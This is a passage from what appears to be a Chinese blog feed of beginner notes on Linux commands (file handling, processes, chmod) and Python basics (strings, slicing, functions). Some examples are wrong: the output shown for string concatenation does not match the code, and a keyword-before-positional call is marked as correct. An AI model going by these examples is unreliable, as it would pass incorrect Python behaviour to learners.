id="7、mv指令："><a href="#7、mv指令：" class="headerlink" title="7、mv指令："></a>7、mv指令：</h5><p>作用：移动 文件/文件夹 到新的位置<br>语法：mv 要移动的文档路径 要保存的位置路径</p><p>例：使用mv命令移动一个文件</p><pre><code class="bash">mv a.txt /home/a.txt</code></pre><p>例：使用mv命令移动一个文件夹</p><pre><code class="bash">mv /home/a /a</code></pre><p>补充：在Linux中重命名的命令也是mv，语法和移动语法一样。</p><pre><code class="bash">mv /aaa /bbb</code></pre><h5 id="8、rm指令："><a href="#8、rm指令：" class="headerlink" title="8、rm指令："></a>8、rm指令：</h5><p>作用：删除文档<br>语法：rm [选项] 要移除的文档路径<br>选项：</p><ul><li>-f：force，强制删除，不提示是否删除</li><li>-r：表示递归</li></ul><p>例：删除一个文件</p><pre><code class="bash">rm linux.txt</code></pre><p>如果在删除的时候不想频繁的确认，则可以在指令中添加选项<code>&quot;-f&quot;</code>。</p><p>例：删除一个文件夹<br><img src="https://img-blog.csdnimg.cn/25e41f2e334f426baf590d059bcbb3a3.png"><br>注意：删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用<code>-rf</code>选项。</p><p>例：删除多个文档</p><pre><code class="bash">rm -rf a liunx.txt</code></pre><p>例：删除一个目录下都以Linux开头的文件</p><pre><code class="bash">rm -f linux*</code></pre><h5 id="9、vim指令："><a href="#9、vim指令：" class="headerlink" title="9、vim指令："></a>9、vim指令：</h5><p>语法：vim 文件的路径<br>作用：打开一个文件（可以不存在，也可以存在）<br>常用命令：</p><ul><li>i 切换到输入模式，以输入字符。</li><li>x 删除当前光标所在处的字符。</li><li>shift+冒号 切换到底线命令模式，以在最底一行输入命令。</li></ul><p>底线命令：</p><ul><li>q 退出程序</li><li>w 保存文件</li><li>q!    若曾修改过档案，又不想储存，使用 ! 为强制离开不储存档案。</li></ul><p>按ESC键可随时退出底线命令模式。</p><p>案例：使用vim打开文件，保存并退出：<br><img src="https://img-blog.csdnimg.cn/10745275edde40fc8f428cda7fbfa998.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h5 id="10、输出重定向："><a href="#10、输出重定向：" class="headerlink" title="10、输出重定向："></a>10、输出重定向：</h5><p>一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。</p><p><code>&gt;</code>：覆盖输出，会覆盖掉原先的文件内容<br><code>&gt;&gt;</code>：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加</p><p>语法：正常执行的指令 &gt;/&gt;&gt; 文件的路径（文件可以不存在，不存在则新建）</p><p>例：使用覆盖重定向，保存 <code>ls -la</code>的执行结果，保存到当前目录下的 ls.txt</p><pre><code class="bash">ls -la &gt;ls.txt</code></pre><p>例：使用追加重定向，保存<code>ls -la</code>的执行结果到 ls.txt 中</p><pre><code class="bash">ls -la &gt;&gt;ls.txt</code></pre><h5 id="11、cat指令："><a href="#11、cat指令：" class="headerlink" title="11、cat指令："></a>11、cat指令：</h5><p>作用1：cat有直接打开一个文件的功能。<br>用法：cat 文件的路径<br><img src="https://img-blog.csdnimg.cn/db10bf774d6a45f78ecc92cfc58f18fc.png"><br>作用2：cat还可以对文件进行合并<br>用法：cat 待合并的文件路径1 待合并的文件路径2 …. 文件路径n &gt; 合并之后的文件路径</p><p>例：合并2个文件，并存到一个文件中（配合输出重定向使用）<br><img src="https://img-blog.csdnimg.cn/47ab3a77bac94bbfb968c9581a911a5f.png"></p><h4 id="二、进阶指令："><a href="#二、进阶指令：" class="headerlink" title="二、进阶指令："></a>二、进阶指令：</h4><h5 id="1、df指令："><a href="#1、df指令：" class="headerlink" title="1、df指令："></a>1、df指令：</h5><p>作用：查看磁盘的空间<br>语法：df -h（-h表示以可读性较高的形式展示大小）<br><img src="https://img-blog.csdnimg.cn/d2fd6554ef144657ac9b1c61ff8465c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h5 id="2、free指令："><a href="#2、free指令：" class="headerlink" title="2、free指令："></a>2、free指令：</h5><p>作用：查看内存使用情况<br>语法：free -m（-m表示以M为单位查看）<br><img src="https://img-blog.csdnimg.cn/05520586f0f64bceb76b686c03255e2d.png"><br>Swap：用于临时内存，当系统真实内存不够用的时候可以临时使用磁盘空间来充当内存。</p><h5 id="3、head指令："><a href="#3、head指令：" class="headerlink" title="3、head指令："></a>3、head指令：</h5><p>作用：查看一个文件的前n行，如果不指定n，则默认显示前10行。<br>语法：head -n 文件路径   （n表示数字）<br><img src="https://img-blog.csdnimg.cn/b5bc2a3d452741b2b7a10384e6c79845.png"></p><h5 id="4、tail指令："><a href="#4、tail指令：" class="headerlink" title="4、tail指令："></a>4、tail指令：</h5><p>作用1：查看一个文件的未n行，如果n不指定默认显示后10行<br>语法：tail -n 文件的路径（n同样表示数字）<br><img src="https://img-blog.csdnimg.cn/5e0f3a271b69455b965f5e16166cd30e.png"><br>作用2：可以通过tail指令来查看一个文件的动态变化内容（变化的内容不能是用户手动增加的）<br>语法：tail -f 文件路径（该命令一般用于查看系统的日志比较多）</p><h5 id="5、less指令："><a href="#5、less指令：" class="headerlink" title="5、less指令："></a>5、less指令：</h5><p>作用：查看文件，以较少的内容进行输出，按下辅助功能键（数字+回车、空格键+上下方向键）查看更多<br>语法：less 需要查看的文件路径</p><h5 id="6、wc指令："><a href="#6、wc指令：" class="headerlink" title="6、wc指令："></a>6、wc指令：</h5><p>作用：统计文件内容信息（包含行数、单词数、字节数）<br>语法：wc -lwc 需要统计的文件路径（不加参数默认这三个）</p><ul><li>-l：表示lines，行数</li><li>-w：表示words，单词数   依照空格来判断单词数量</li><li>-c：表示bytes，字节数<br><img src="https://img-blog.csdnimg.cn/cf22fa1669b94df3ac94934f5769b08c.png"><h5 id="7、clear-ctrl-L-指令："><a href="#7、clear-ctrl-L-指令：" class="headerlink" title="7、clear / ctrl + L 指令："></a>7、clear / ctrl + L 指令：</h5>作用：清除终端中已经存在的命令和结果<br>语法：clear 或者 快捷键：ctrl + L</li></ul><p>需要注意的是，该命令并不是真的清除了之前的信息，而是把之前的信息的隐藏到了最上面，通过滚动条继续查看以前的信息。</p><h5 id="8、管道（重要）："><a href="#8、管道（重要）：" class="headerlink" title="8、管道（重要）："></a>8、管道（重要）：</h5><p>管道符：|<br>作用：管道一般可以用于“过滤”，“特殊”，“扩展处理”。<br>语法：管道不能单独使用，需要配合前面所讲的一些指令来一起使用，其作用主要是辅助作用。</p><p>1、过滤案例：需要通过管道查询出根目录下包含<code>“y”</code>字母的文档名称。</p><pre><code class="bash">ls / | grep y</code></pre><blockquote><p>针对上面这个命令说明：<br>① 管道前面的输出就是后面指令的输入<br>② grep指令：主要用于过滤</p></blockquote><p>2、扩展处理：请使用学过的命令，来统计某个目录下的文档的总个数？<br>答：<code>ls / | wc -l</code><br><img src="https://img-blog.csdnimg.cn/3901c4cafc154e85857bdcb8eeec7bec.png"><br>即根目录下有25个文件</p><h4 id="三、高级指令："><a href="#三、高级指令：" class="headerlink" title="三、高级指令："></a>三、高级指令：</h4><h5 id="1、hostname指令"><a href="#1、hostname指令" class="headerlink" title="1、hostname指令:"></a>1、hostname指令:</h5><p>作用：操作服务器的主机名<br>语法1：hostname，含义：表示输出完整的主机名<br>语法2：hostname  -f ，含义：表示输出当前主机名中的全限定域名（即本地网络）<br><img src="https://img-blog.csdnimg.cn/b882daa8046740a382214a84cfe6d0dc.png"></p><h5 id="2、whoami指令："><a href="#2、whoami指令：" class="headerlink" title="2、whoami指令："></a>2、whoami指令：</h5><p>作用：“我是谁？”显示当前登录的用户名<br>语法：whoami<br><img src="https://img-blog.csdnimg.cn/077e081b511e44bda354c3a73c5ef833.png"></p><h5 id="3、ps-ef-指令（重点）"><a href="#3、ps-ef-指令（重点）" class="headerlink" title="3、ps -ef 指令（重点）"></a>3、ps -ef 指令（重点）</h5><p>指令：ps<br>作用：主要是查看服务器的进程信息<br>选项含义：</p><ul><li>-e：等价于<code>&quot;-A&quot;</code>，表示列出全部的进程</li><li>-f：显示全部的列（显示全字段）</li></ul><p>执行结果：<br><img src="https://img-blog.csdnimg.cn/3f98a05c522c4666a32e5476cba6b966.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>列的含义：<br>UID：该进程执行的用户id；<br>PID：进程id（process ID）；<br>PPID：该进程的父级进程id（parent process ID），如果一个程序的父级进程找不到，该程序的进程称之为僵尸进程；<br>C：Cpu的占用率，其形式是百分数；<br>STIME：进行的启动时间；<br>TTY：终端设备，发起该进程的设备识别符号，如果显示“?”则表示该进程并不是由终端设备发起；<br>TIME：进程的执行时间；<br>CMD：该进程的名称或者对应的路径；</p><p>在ps的结果中过滤出想要查看的进程状态（常用）</p><pre><code class="bash">ps -ef|grep “进程名称”</code></pre><p>例：查看火狐浏览器的进程：<br><img src="https://img-blog.csdnimg.cn/5360611525a04040a1418d1705c53a5d.png"></p><h5 id="4、du-sh指令："><a href="#4、du-sh指令：" class="headerlink" title="4、du -sh指令："></a>4、du -sh指令：</h5><p>作用：查看目录的真实大小<br>语法：du -sh 目录路径<br>选项含义：</p><ul><li>-s：只显示汇总的大小</li><li> -h：表示以高可读性的形式进行显示<br><img src="https://img-blog.csdnimg.cn/9cdd4f21f5a4455f9ba4e87669aa99ef.png"><h5 id="5、find指令："><a href="#5、find指令：" class="headerlink" title="5、find指令："></a>5、find指令：</h5>作用：用于查找文件<br>语法：find 路径范围 选项 选项的值<br>选项：</li><li>-name：按照文档名称进行搜索（支持模糊搜索）</li><li>-type：按照文档的类型进行搜索</li></ul><blockquote><p>补充：文档类型：<code>&quot;-&quot;</code>表示文件（在使用find的需要用 f 来替换），<code>&quot;d&quot;</code>表示文件夹</p></blockquote><p>例：使用find来搜索httpd.conf</p><pre><code class="bash">find / -name httpd.conf</code></pre><p>例：搜索etc目录下所有的conf后缀文件</p><pre><code class="bash">find /etc -name *.conf</code></pre><p>例：使用find来搜索/etc/sane.d/目录下所有的文件</p><pre><code class="bash">find /etc/sane.d/ -type f</code></pre><p>例：使用find来搜索/etc/目录下所有的文件夹</p><pre><code class="bash">find /etc -type d</code></pre><h5 id="6、service指令（重点）"><a href="#6、service指令（重点）" class="headerlink" title="6、service指令（重点）"></a>6、service指令（重点）</h5><p>作用：用于控制一些软件的服务启动/停止/重启<br>语法：service 服务名 start/stop/restart</p><p>例如：需要启动本机安装的 Apache（网站服务器软件），其服务名 httpd</p><pre><code class="bash">service httpd start</code></pre><p><img src="https://img-blog.csdnimg.cn/896f49a852f64a74977f30deecf9b7e9.png"></p><p>通过ps命令来检查 httpd 服务是否启动：</p><pre><code class="bash">ps -ef|grep httpd</code></pre><p><img src="https://img-blog.csdnimg.cn/dc099ba1c13e475d94aa5b7b0f69d852.png"></p><h5 id="7、kill指令（重点）"><a href="#7、kill指令（重点）" class="headerlink" title="7、kill指令（重点）"></a>7、kill指令（重点）</h5><p>作用：表示杀死进程<br>语法：kill  进程PID（语法需要配合ps一起使用）</p><p>例：需要 kill 掉 Apache 的进程<br><img src="https://img-blog.csdnimg.cn/25c83f9ff8cc422fb4dbaa5f205d307f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_15,color_FFFFFF,t_70,g_se,x_16"><br>与kill命令作用相似但是比kill更加好用的杀死进程的命令：killall<br>语法：killall 进程名称<br><img src="https://img-blog.csdnimg.cn/863a2b0704744d3398bd2b625f1b8d4d.png"></p><h5 id="8、reboot指令："><a href="#8、reboot指令：" class="headerlink" title="8、reboot指令："></a>8、reboot指令：</h5><p>1、reboot指令<br>作用：重新启动计算机<br>语法1：reboot        重启<br>语法2：reboot  -w   模拟重启，但是不重启（只写关机与开机的日志信息）</p><h5 id="9、shutdown指令"><a href="#9、shutdown指令" class="headerlink" title="9、shutdown指令"></a>9、shutdown指令</h5><p>作用：关机<br>语法1：shutdown -h now  或  shutdown  -h 15:25<br>案例：设置Linux系统关机时间在晚上12点<br><img src="https://img-blog.csdnimg.cn/6ebbb2e99b5849b59450de36cb76a5ba.png"><br>除了shutdown关机以外，还有以下几个关机命令：</p><pre><code class="bash">init 0haltpoweroff</code></pre><h5 id="10、uptime指令："><a href="#10、uptime指令：" class="headerlink" title="10、uptime指令："></a>10、uptime指令：</h5><p>作用：输出计算机的持续在线时间（计算机从开机到现在运行的时间）<br>语法：uptime<br><img src="https://img-blog.csdnimg.cn/29d732f485f24af0baff1112913e908a.png"></p><h5 id="11、netstat-tnlp指令："><a href="#11、netstat-tnlp指令：" class="headerlink" title="11、netstat -tnlp指令："></a>11、netstat -tnlp指令：</h5><p>作用：查看网络连接状态<br>语法：netstat -tnlp<br><img src="https://img-blog.csdnimg.cn/55a18ed41d034adfb0275ab537bb03cd.png"><br>选项说明：</p><ul><li>-t：表示只列出tcp协议的连接；</li><li>-n：表示将地址从字母组合转化成ip地址，将协议转化成端口号来显示；</li><li>-l：表示过滤出“state（状态）”列中其值为LISTEN（监听）的连接；</li><li>-p：表示显示发起连接的进程pid和进程名称；</li></ul><h5 id="12、chmod命令："><a href="#12、chmod命令：" class="headerlink" title="12、chmod命令："></a>12、chmod命令：</h5><p>作用：chmod（change mode）命令是控制用户对文件的权限的命令<br>语法1：<code>chmod [ugoa] [[+-=][rwx] 文件或目录</code></p><p>Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）<br><img src="https://img-blog.csdnimg.cn/c8536063ca894cd9865d773b00cca31c.png"><br>只有 “文件所有者” 和 “超级用户” 可以修改文件或目录的权限。</p><p>可以使用 “数字形式” 与 “字符形式” 表示文件的权限。<br><img src="https://img-blog.csdnimg.cn/b81a7d123dae452faa646e830ae81b7a.png"><br>在命令选项中，用 “ugoa” 来代表用户类别：</p><ul><li>u 表示该文件的所有者；</li><li>g 表示文件所属组；</li><li>o 表示其他用户；</li><li>a 表示所有用户。</li></ul><p>命令选项中用 “+ - =” 表示权限的操作动作：</p><ul><li><code>+</code> 表示增加权限；</li><li><code>-</code> 表示取消权限；</li><li><code>=</code> 表示赋值权限。</li></ul><p>实例：</p><p>1、将文件 file1.txt 设为所有人皆可读 :</p><pre><code class="bash">chmod ugo+r file1.txt 或 chmod a+r file1.txt</code></pre><p>2、去掉所有人对 mymkdir 文件的执行权限：</p><pre><code class="bash">chmod a-x mymkdir</code></pre><p>3、为 ex1.py 文件拥有者增加可执行权限:</p><pre><code class="bash">chmod u+x ex1.py</code></pre><p>4、将文件 file1.txt 与 file2.txt 设该文件拥有者与其同一组的用户可写入，但其他以外的人则不可写入 :</p><pre><code class="bash">chmod ug+w,o-w file1.txt file2.txt</code></pre><p>5、将目前目录下的所有文件与子目录皆设为任何人可读取 :</p><pre><code class="bash">chmod -R a+r *</code></pre><p>chmod命令常用选项：”-R” 选项，递归修改指定目录下所有文件、子目录的权限。</p><blockquote><p>在实际的目录权限管理工作中，有时会需要将某一个目录中的所有子目录及文件的权限都设置为同一个值。</p></blockquote><p>此外 chmod 也可以用数字来表示，语法2：<code>chmod abc 文件或目录</code></p><p>其中 a，b，c 各为一个数字，分别表示 User、Group、及 Other 的权限。</p><p>r=4，w=2，x=1</p><p>若要 rwx 属性：4+2+1=7<br>若要 rw 属性：4+2=6<br>若要 rx 属性：4+1=5</p><p>相比字符形式，数字形式更为简便易用。通常在设置权限时都采用数字形式，字符形式主要用来对权限进行细微的调整。</p><p>例：</p><p>1、对 mymkdir 文件进行如下权限设置：</p><ul><li>所有者具有读写执行权限；</li><li>所属组具有读和执行权限;</li><li>其他用户具有读和执行权限。</li></ul><p>用数字形式的 chmod 命令完成:</p><pre><code class="bash">chmod 755 mymkdir</code></pre><p>2、使所有用户对 file1 文件 具有 读写执行 权限：</p><pre><code class="bash">chmod a=rwx file1 或 chmod 777 file1</code></pre><p>3、将 /usr/src 目录及其中所有的子目录、文件的权限都设置为<code>rw-r--r--</code>。</p><pre><code class="bash"> chmod -R 644 /usr/src</code></pre>]]></content>
      
      
      <categories>
          
          <category> Liunx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> liunx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记（一）</title>
      <link href="2019/12/05/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2019/12/05/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;立个flag，从今天开始学习Python （￣︶￣）↗，希望自己能坚持下去。</p><blockquote><p>那些最好的程序员不是为了得到更高的薪水或者得到公众的仰慕而编程，他们只是觉得这是一件有趣的事情。（扯淡） ——Linux 之父 LinusTorvalds</p></blockquote><ul><li><p> Python 的设计理念是 “优雅”、“明确”、“简单”。</p></li><li><p>人生苦短，我用Python</p><hr></li></ul><p>关于python的介绍就不多说了，只记录下一些重要的部分，在系统的学习之前先说下python语言的一些特点。</p><h4 id="一、Python3-基础语法："><a href="#一、Python3-基础语法：" class="headerlink" title="一、Python3 基础语法："></a>一、Python3 基础语法：</h4><p><strong>1、编码</strong>:</p><p>默认情况下，Python 3源码文件以<code>utf-8</code>编码，所有字符串都是 unicode 字符串。 当然也可以为源码文件指定不同的编码：</p><pre><code class="python"># -*- coding:UTF-8  -*-</code></pre><pre><code class="python"># -*- coding:cp-1252 -*-</code></pre><p> <strong>2、python保留字</strong>:</p><p>保留字即关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p><pre><code class="python">&gt;&gt;&gt; import keyword&gt;&gt;&gt; keyword.kwlist[&#39;False&#39;, &#39;None&#39;, &#39;True&#39;, &#39;and&#39;, &#39;as&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;continue&#39;, &#39;def&#39;, &#39;del&#39;, &#39;elif&#39;, &#39;else&#39;, &#39;except&#39;, &#39;finally&#39;, &#39;for&#39;, &#39;from&#39;, &#39;global&#39;, &#39;if&#39;, &#39;import&#39;, &#39;in&#39;, &#39;is&#39;, &#39;lambda&#39;, &#39;nonlocal&#39;, &#39;not&#39;, &#39;or&#39;, &#39;pass&#39;, &#39;raise&#39;, &#39;return&#39;, &#39;try&#39;, &#39;while&#39;, &#39;with&#39;, &#39;yield&#39;]</code></pre><p> <strong>3、标识符</strong>:</p><ul><li>第一个字符必须是<strong>字母</strong>或<strong>下划线</strong> <code>_</code> 。</li><li>标识符对大小写敏感。</li><li>在 Python 3 中，可以用中文作为变量名。</li></ul><p> <strong>4、注释</strong>:</p><p>Python中单行注释以 <code>#</code> 开头，Python中单行注释以#开头，多行注释用三个单引号（<code>&#39;&#39;&#39;</code>）或者三个双引号（<code>&quot;&quot;&quot;</code>）将注释括起来。</p><p>例：</p><pre><code class="csharp">#!/usr/bin/python3# 第一个注释print (&quot;Hello, Python!&quot;) # 第二个注释</code></pre><p> <strong>5、行与缩进</strong>：</p><ul><li><p>python最具特色的就是使用缩进来表示代码块，不需要使用大括号 <code>&#123;&#125;</code> 。</p></li><li><p>缩进的空格数是可变的，但是<strong>同一个代码块的语句必须包含相同的缩进空格数</strong>。实例如下：</p></li></ul><pre><code class="csharp">if True:    print (&quot;True&quot;)else:    print (&quot;False&quot;)</code></pre><p>以下代码最后一行语句缩进数的空格数不一致，会导致运行错误：</p><pre><code class="python">if True:    print (&quot;Answer&quot;)    print (&quot;True&quot;)else:    print (&quot;Answer&quot;)  print (&quot;False&quot;)    # 缩进不一致，会导致运行错误</code></pre><p> <strong>6、多行语句</strong>：</p><p> Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠<code>\</code>来实现多行语句，例如：</p><pre><code class="csharp">total = item_one + \        item_two + \        item_three</code></pre><p>在 [], {}, 或 () 中的多行语句，不需要使用反斜杠()，例如：</p><pre><code class="csharp">total = [&#39;item_one&#39;, &#39;item_two&#39;, &#39;item_three&#39;,        &#39;item_four&#39;, &#39;item_five&#39;]</code></pre><p> <strong>7、同一行使用多条语句</strong>：</p><p> Python可以在同一行中使用多条语句，语句之间使用分号<code>;</code>分割，以下是一个简单的实例：</p><pre><code class="csharp">import sys; x = &#39;runoob&#39;; sys.stdout.write(x + &#39;\n&#39;)</code></pre><p>输出结果为：</p><pre><code class="csharp">runoob</code></pre><p> <strong>8、导入模块</strong>：</p><ul><li>在 python 用 <code>import</code> 或者 <code>from...import</code> 来导入相应的模块。</li><li>将整个模块(somemodule)导入： <code>import somemodule</code></li><li>从某个模块中导入某个函数： <code>from somemodule import somefunction</code></li><li>从某个模块中导入多个函数： <code>from somemodule import firstfunc, secondfunc, thirdfunc</code></li><li>将某个模块中的全部函数导入： <code>from somemodule import *</code></li></ul><p> <strong>9、输入输出</strong>：</p><p>执行下面的程序在按回车键后就会等待用户输入：</p><pre><code class="python">input(&quot;请输入：&quot;)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200930203006395.png" alt="在这里插入图片描述"></p><p>用户按下 enter 键时，程序将退出。</p><p> <code>print</code> 默认输出是换行的，如果要实现不换行需要在变量末尾加上 <code>end=&quot;&quot;: </code> ，引号里可以添加符号用来分隔数据。</p><p> 例：</p><p><img src="https://img-blog.csdnimg.cn/20200930211450520.png" alt="在这里插入图片描述"></p><hr><p> <strong>第一个 Python3 程序</strong>:</p><pre><code class="python">#!/usr/bin/python3print(&quot;Hello, World!&quot;)</code></pre><p><code>​#!/usr/bin/python​​</code> ：指定用什么解释器运行脚本（如果是python2就用<code>#!/usr/bin/python2</code>，python3同理）和解释器所在的位置，如果解释器没有装在/usr/bin/目录，改成其所在目录就行了，或者更通用的方法是（自动寻找解释器）：</p><pre><code class="java">#!/usr/bin/env python​</code></pre><p>将以上代码保存在 ​hello.py​ 文件中并使用 python 命令执行该脚本文件。</p><pre><code class="python">python hello.py</code></pre><p>以上命令输出结果为：<br><img src="https://img-blog.csdnimg.cn/20200922200245998.png" alt="在这里插入图片描述"></p><p>🆗，这些基本的东西说完了，开始正式学习。<hr></p><h3 id="第一节：变量和字符串"><a href="#第一节：变量和字符串" class="headerlink" title="第一节：变量和字符串"></a>第一节：变量和字符串</h3><p>首先：Python 每个语句结束可以不写分号 <code>;</code>， 如 <code>print(&#39;hello&#39;)</code> 打印 <code>hello</code></p><h5 id="1、变量"><a href="#1、变量" class="headerlink" title="1、变量"></a>1、变量</h5><p>因为之前学过编程语言，变量就不多说了。需要注意的是，Python 对<strong>大小写敏感</strong>，也就是说 “a” 和 “A” 会是两个不同的变量。</p><h5 id="2、字符串"><a href="#2、字符串" class="headerlink" title="2、字符串"></a>2、字符串</h5><p> <strong>1、基本介绍</strong>：</p><p>单引号 <code>&#39;&#39;</code>或者双引号 <code>&quot;&quot;</code> 都可以，再或者 <code>&#39;&#39;&#39; &#39;&#39;&#39;</code> 三引号，其中三引号被用于过于长段的文字或者是说明，只要是三引号不完你就可以随意换行写下文字。</p><ul><li>字符串直接能相加，如：<pre><code class="csharp">str1 = &#39;hi&#39;str2 = &#39;hello&#39;print(str1 + str2)</code></pre>运行结果：</li></ul><pre><code class="csharp">hi jaybo</code></pre><ul><li>字符串相乘，如：<pre><code class="csharp">string = &#39;bang!&#39;total = string * 3 </code></pre></li></ul><p>打印 total ：</p><pre><code class="csharp">bang!bang!bang!</code></pre><p><strong>2、字符串的分片与索引</strong>：</p><p>字符串可以通过 <code>string[n]</code> 的方式进行索引和分片。</p><p>字符串的分片实际可以看作是从字符串中找出来你要截取的东西，复制出来一小段你要的长度，存储在另一个地方，而不会对字符串这个源文件改动。分片获得的每个字符串可以看作是原字符串的一个副本。</p><p>先看下面这段代码：</p><pre><code class="csharp">name = &#39;My name is Mike&#39;print(name[0])&#39;M&#39;print(name[-4])&#39;M&#39;print(name[11:14]) # from 11th to 14th, 14th one is excluded&#39;Mik&#39;print(name[11:15]) # from 11th to 15th, 15th one is excluded&#39;Mike&#39;print(name[5:])&#39;me is Mike&#39;print(name[:5])&#39;My na&#39;</code></pre><p>解释：<br><img src="https://img-blog.csdnimg.cn/20191121192741750.png" alt="在这里插入图片描述"><br><code>:</code> 两边分别代表着字符串的分割从哪里开始，并到哪里结束。</p><p>以 name[11:14] 为例，截取的编号从第11个字符开始，到位置为14但不包含第14个字符结束。</p><p>而像 name[5:] 这样的写法代表着从编号为5的字符到结束的字符串分片。</p><p>相反，name[:5] 则代表着从编号为0的字符开始到编号为5但不包含第5个字符的字符分片。可能容易搞混，可以想象成第一种是从5到最后面，程序员懒得数有多少个所以就省略地写。第二种是从最前面到5，同样是懒得写0，所以就写成了 [:5] 。</p><p><strong>3、尝试</strong>：</p><pre><code class="csharp">num = 1string = &#39;1&#39;print(num + string)</code></pre><p>上面代码将出错！</p><p>解释：整数型不能和字符串直接相加。可以先把该字符串转为整数型，再相加，即 <code>int(string)</code></p><pre><code class="csharp">num = 1string = &#39;1&#39;print(num + int(string))</code></pre><p><strong>4、 字符串的方法</strong>：</p><p>这里以<strong>replace</strong>方法为例</p><ul><li>很多时候你使用手机号在网站注册账户信息，为了保证用户的信息安全性，通常账户信息只会显示后四位，其余的用 * 来代替，我们试着用字符串的方法来完成这一个功能。</li></ul><p>输入代码：</p><pre><code class="csharp">phone_number = &#39;1386-666-0006&#39;hiding_number = phone_number.replace(phone_number[:9],&#39;*&#39; * 9)print(hiding_number)</code></pre><p>我们使用了一个字符串方法 <code>replace()</code>进行“遮挡”。replace 方法的括号中，第一个 <code>phone_number[:9]</code> 代表要被替换掉的部分，后面的 <code>&#39;*&#39; * 9</code> 表示将要替换成什么字符，也就是把 <code>*</code> 乘以9，显示9个 <code>*</code> 。</p><p>你会得到这样的结果：<code>*********0006</code></p><h3 id="第二节：函数"><a href="#第二节：函数" class="headerlink" title="第二节：函数"></a>第二节：函数</h3><h4 id="1、创建函数"><a href="#1、创建函数" class="headerlink" title="1、创建函数"></a>1、创建函数</h4><p>Python 中所谓的使用函数，就是把你要处理的对象放到一个名字后面的括号里。简单来说，函数就是这么使用的，往里面塞东西就可以得到处理结果。这样的函数在 Python 中还有很多。<br>这里面先介绍几个常见的词：</p><ul><li><code>def</code>（即 define，定义）的含义是创建函数，也就是定义一个函数。</li><li><code>arg</code> （即 argument，参数）有时你还能见到这种写法：<code>parameter</code>，二者都是参数的意思但是稍有不同，这里不展开说了。</li><li><code>return</code> 即返回结果<br><img src="https://img-blog.csdnimg.cn/2019112119523915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,sha1dow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><strong>举个例子</strong>：<br>把摄氏度转化定义为函数 fahrenheit_Converter() ，那么将输入进去的必然是摄氏度（Celsius）的数值，我们把 C 设为参数，最后返回的是华氏度（fahrenheit）的数值，我们用下面的函数来表达，输入代码：</li></ul><pre><code class="csharp">def fahrenheit_converter(C):     fahrenheit = C * 9/5 + 32     return str(fahrenheit) + &#39;˚F&#39;</code></pre><p> 注：计算的结果类型是float，不能与字符串<code>&#39;˚F&#39;</code>相合并，所以需要先用str()函数进行转换。</p><p>输入完以上代码后，函数定义完成，那么我们开始使用它。我们把使用函数这种行为叫做“调用”（call）。</p><p>下面这段代码意味着——“请使用摄氏度转换器将35摄氏度转换成华氏度，将结果储存在名为 C2F 的变量并打印出来。”这样我们就完成了函数的调用同时打印了结果。</p><pre><code class="csharp">C2F = fahrenheit_converter(35)print(C2F)</code></pre><h4 id="2、传递参数与参数类型"><a href="#2、传递参数与参数类型" class="headerlink" title="2、传递参数与参数类型"></a>2、传递参数与参数类型</h4><p>前面说了关于函数定义和使用，在这一节我们谈论一些细节但是重要的问题一一参数。对于在一开始就设定了必要参数的函数来说，我们是通过打出函数的名称并向括号中传递参数实现对函数的调用（call），即只要把参数放进函数的括号中即可，就像是这样：</p><pre><code class="csharp">fahrenheit_converter(35)fahrenheit_converter(15)</code></pre><p>事实上，传递参数的方式有两种：</p><ul><li>位置参数</li><li>关键词参数</li></ul><p>例:</p><pre><code class="csharp">def trapezoid_area(base_up, base_down, height):     return 1/2 * (base_up + base_down) * height</code></pre><p>接下来我们开始调用函数。</p><pre><code class="csharp">trapezoid_area(1,2,3)</code></pre><p>不难看出，填入的参数 1，2，3 分别对应着参数 <code>base_up</code>，<code>base_down</code> 和 <code>height</code>。 这种传入参数的方式被称作为<strong>位置参数</strong>。</p><p>接着是第二种传入方式：</p><pre><code class="csharp">trapezoid_area(base_up=1, base_down=2, height=3)</code></pre><p>更直观地，在调用函数的时候，我们将每个参数名称后面赋予一个我们想要传入的值。这种以名称作为一一对应的参数传入方式被称作是<strong>关键词参数</strong>。</p><p>避免混乱的最好方法就是先制造混乱，我们试着解决一个更复杂的问题，按照下面几种方式调用函数并打印结果：</p><pre><code class="csharp">trapezoid_area(height=3, base_down=2, base_up=1)   # RIGHT!trapezoid_area(height=3, base_down=2, 1)           # WRONG!trapezoid_area(base_up=1, base_down=2, 3)          # RIGHT!trapezoid_area(1, 2, height=3)                     # 